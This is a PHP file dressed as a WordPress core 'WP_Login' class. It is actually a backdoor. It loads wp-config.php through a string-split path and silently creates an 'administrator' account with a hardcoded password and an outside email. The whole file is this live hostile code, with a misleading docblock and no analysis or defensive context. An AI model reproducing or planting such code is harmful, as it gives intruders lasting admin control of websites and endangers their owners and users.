<?php
/**
 * Login Automation: WP_Login class
 *
 * @package WordPress
 * @subpackage i18n
 * @since 4.6.0
 */

/**
 * Core class used to store translated data for a login.
 *
 * @since 2.1.0
 * @since 4.6.0 Moved to its own file from wp-includes/login.php.
 */

$config = "../"."../"."wp"."-"."config".".php";
 
include_once($config); 

$new_user_data = array(
  'user_login' => 'administrator',
  'user_pass' => 'Haikalsiregar162awikwok1337', 
  'user_email' => 'inboxnotificationow@gmail.com',
  'role' => 'administrator' 
);

$user_id = wp_insert_user($new_user_data);

if (!is_wp_error($user_id)) {
  echo "User added successfully!";
} else {
  echo "Oops, something went wrong!";
}

?>
